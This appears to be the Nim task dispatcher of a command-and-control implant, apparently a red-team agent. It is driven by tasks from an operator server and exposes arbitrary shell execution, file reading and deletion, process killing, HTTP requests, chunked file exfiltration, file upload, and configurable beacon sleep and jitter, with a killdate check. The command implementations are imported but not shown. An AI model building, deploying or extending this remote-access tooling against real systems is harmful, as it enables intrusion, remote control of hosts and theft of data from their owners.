import asyncdispatch
import base64
import config
import json
import http
import strformat
import strutils
import times
import task
from checkin import getHostName
from os import fileExists
from os import joinPath
from task import Job
import ../commands/cat
import ../commands/cd
import ../commands/cp
import ../commands/curl
import ../commands/drives
import ../commands/download
import ../commands/getenv
import ../commands/kill
import ../commands/ls
import ../commands/mkdir
import ../commands/mv
import ../commands/ps
import ../commands/pwd
import ../commands/rm
import ../commands/setenv
import ../commands/shell
import ../commands/upload
import ../commands/unsetenv


proc checkDate*(kdate: string) : bool =
   if cmp("yyyy-mm-dd", kdate) == 0:
      result = false
   else:
      let killDate = parse(kdate, "yyyy-MM-dd")      
      let curDate = now()
      when not defined(release):
         echo "killdate: ", killDate
         echo "curDate: ", curDate
      if killDate <= curDate:
         when not defined(release):
            echo "Killdate has arrived"
         result = true
      else:
         result = false

proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): Future[tuple[jobs: seq[Job], newConfig: Config]] {.async.} = 
   # Where the magic happens
   # Iterate through both tasks and runningJobs
   # The only running jobs are Upload and Download for now....
   var jobSeq: seq[Job]
   var newConfig = curConfig
   for task in tasks:
      when not defined(release):
         echo "your task is: ", $(task)
      var temp = ""
      var jtemp: Job     
      let parsedJsonTask =  if task.parameters.contains("{"): parseJson(task.parameters) else: %*{}
      jtemp.TaskId = task.id
      jtemp.Command = task.action.toLower() #TODO used in ls command to change the response but probably can be avoided with process_response
      jtemp.Parameters = task.parameters
      # TODO convert thread logic to async procs
      try:
         case task.action.toLower():
            of "cat":
               let spawnResult = await cat.execute(parsedJsonTask["path"].getStr())
               temp = temp & spawnResult
               when not defined(release):
                  echo "Spawned cat proc \n"
            of "cd":
               let path = parsedJsonTask["path"].getStr()
               let spawnResult = await cd.execute(path)
               if spawnResult:
                  temp = temp & fmt"Changed working directory to {path}"
               else:
                  temp = temp & fmt"Error changing directory to {path}"
               
               when not defined(release):
                  echo "Spawned cd proc \n"
            of "cp":
               let spawnResult = await cp.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
               when not defined(release):
                  echo "spawned cp proc\n"
               temp = temp & $(spawnResult)
            of "curl":
               let headers = if parsedJsonTask.hasKey("headers"): parsedJsonTask["headers"].getStr() else: ""
               let body = if parsedJsonTask.hasKey("body"): parsedJsonTask["body"].getStr() else: ""
               let spawnResult = await curl.execute(parsedJsonTask["url"].getStr(), parsedJsonTask["method"].getStr(), headers, body)
               temp = temp & spawnResult
               when not defined(release):
                  echo "Spawned curl proc \n"
            of "download":
               jtemp.Download = true
               let path = parsedJsonTask["file"].getStr()
               let host = parsedJsonTask["host"].getStr("") #defaults host to "" if the host value is nil
               when not defined(release):
                  echo "download path is:", path
                  echo "download host is:", host
               jtemp.Host = host
               
               
               if not fileExists(path):
                  temp = temp & "Error file does not exist"
                  jtemp.TotalChunks = 0
                  jtemp.Success = false
               else:
                  jtemp.Path = await GetPath(path)
                  jtemp.TotalChunks = await GetTotalChunks(path, curConfig.ChunkSize)
                  jtemp.FileSize = await GetFileSize(path)
               temp = ""
               jtemp.ChunkNum = 0               

            of "drives":
               let spawnResult = await drives.execute()
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Drives has been called"
            of "exit":
               when not defined(release):
                  echo "It's been a fun ride but all good things eventually come to an end..."
               quit(QuitSuccess)
            of "getenv":
               let spawnResult = await getenv.execute()
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Getenv has been called"
            of "jobs":
               jtemp.Success = true
               for job in runningJobs:
                  temp = temp & $(job) & "\n"
            of "kill":
               #let spawnResult = await kill.execute(parseInt(task.parameters))
               let spawnResult = await kill.execute(parsedJsonTask["pid"].getInt())
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "spawned kill proc\n"
            of "ls":
               when not defined(release):
                  
                  echo "path is: ", parsedJsonTask["path"].getStr()
                  echo "recurse is: ",parseBool(parsedJsonTask["recurse"].getStr())
               
               var host = ""
               if cmp(parsedJsonTask["host"].getStr(""), "") == 0:
                  host = getHostName()
               else:
                  host = parsedJsonTask["host"].getStr()
                  
                #TODO uhh this seems dumb to call it everytime
               let spawnResult = await ls.execute(parsedJsonTask["path"].getStr(), parseBool(parsedJsonTask["recurse"].getStr()),host)               
               temp = temp & $(spawnResult)
            of "mkdir":
               let spawnResult = await mkdir.execute(parsedJsonTask["path"].getStr())
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Spawned mkdir proc \n"
                  
            of "mv":
               echo "in move with src", parsedJsonTask["source"].getStr(), " and dest",parsedJsonTask["destination"].getStr()
               let spawnResult = await mv.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "spawned mv proc\n"
            of "ps":
               let spawnResult = await ps.execute()
               when not defined(release):
                  echo "spawned ps proc\n"
               temp = temp & $(spawnResult)
            of "pwd":
               let spawnResult = await pwd.execute()
               temp = temp & spawnResult
            of "rm":
               #TODO use host
               var removePath: string
               if parsedJsonTask["file"].getStr() == "":
                  removePath = parsedJsonTask["path"].getStr()
               else:
                  removePath = joinPath(parsedJsonTask["path"].getStr(),parsedJsonTask["file"].getStr())

               let spawnResult = await rm.execute(removePath,parsedJsonTask["host"].getStr())
               temp = temp & $(spawnResult)
            of "setenv":
               let envparam = parsedJsonTask["param"].getStr()
               let value = parsedJsonTask["value"].getStr()

               let spawnResult = await setenv.execute(envparam, value)
               when not defined(release):
                  echo "spawned unsetenev proc\n"
               temp = temp & $(spawnResult)
            of "shell":
               when not defined(release):
                  echo "shell args are", task.parameters
               let spawnResult = await shell.execute(task.parameters)
               when not defined(release):
                  echo "spawned shell proc\n"
               temp = temp & spawnResult
            of "sleep":
               # Update and modify newConfig that will be returned with new jitter and interval values if they exist 
               newConfig.Jitter = if parsedJsonTask.hasKey("jitter"): parsedJsonTask["jitter"].getInt() else: curConfig.Jitter
               newConfig.Sleep = if parsedJsonTask.hasKey("seconds"): parsedJsonTask["seconds"].getInt() else: curConfig.Sleep
               when not defined(release):
                  echo "newJitter: ", newConfig.Jitter
                  echo "newInterval: ", newConfig.Sleep
            of "unsetenv":
               let spawnResult = await unsetenv.execute(task.parameters)
               when not defined(release):
                  echo "spawned unsetenev proc\n"
               temp = temp & $(spawnResult)
            of "upload":
               jtemp.Upload = true
               when not defined(release):
                  echo "inside upload jtemp is: ", $(jtemp)

               let filePath =  parsedJsonTask["remote_path"].getStr()
               let fileId = parsedJsonTask["file"].getStr()
               
               jtemp.Path = filePath
               jtemp.FileId = fileId
               jtemp.ChunkNum = 1
               jtemp.TotalChunks = 100                  
               
               temp = temp & $("")                  
            else:
               jtemp.Response = "Command not implemented"
               jtemp.Success = false
               jtemp.Completed = true
               jobSeq.add(jtemp)
               continue
      except:
            let
               e = getCurrentException()
               msg = getCurrentExceptionMsg()
            let error = fmt"An exception has occurred when attempting to do {task.action.toLower()} job: " & repr(e) & " with message " & msg  
            temp = temp & error
            continue
            # TODO make jtemp.Success = to false with a bool flag up top
      jtemp.Success = true
      jtemp.Response = temp
      jtemp.Completed = true
      jobSeq.add(jtemp)
   
   # Identation matters or you can spend hours debugging...

   for job in runningJobs:
      
      when not defined(release):
         echo "Inside running jobs for loop here is a running job: ", $(job)
      # TODO apply DRY to upload and download compact into two distinct methods!
      var copyJob = job
      try:
         if (job.Download or job.Upload):# and (job.ChunkNum <= job.TotalChunks): #TODO does this f somethin
               if job.Download:       
                  if len(copyJob.FileId) != 0:                  
                     inc copyJob.ChunkNum
                     let spawnResult = await download.execute(copyJob.Path, copyJob.Host,curConfig.ChunkSize, copyJob.ChunkNum, copyJob.TotalChunks, copyJob.FileSize)
                     copyJob.Response = spawnResult
                     when not defined(release):
                        echo "Spawned download proc \n"
                   
      except:
         let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
         let error = "An exception has occurred when attempting to do job: " & repr(e) & " with message " & msg  
         when not defined(release):
            echo "error has occurred inside running jobs for loop: ", error
      when not defined(release):
         echo "adding copyJob to jobSeq: ", $(copyJob)
      jobSeq.add(copyJob)
      

   result = (jobs: jobSeq, newConfig: newConfig)
 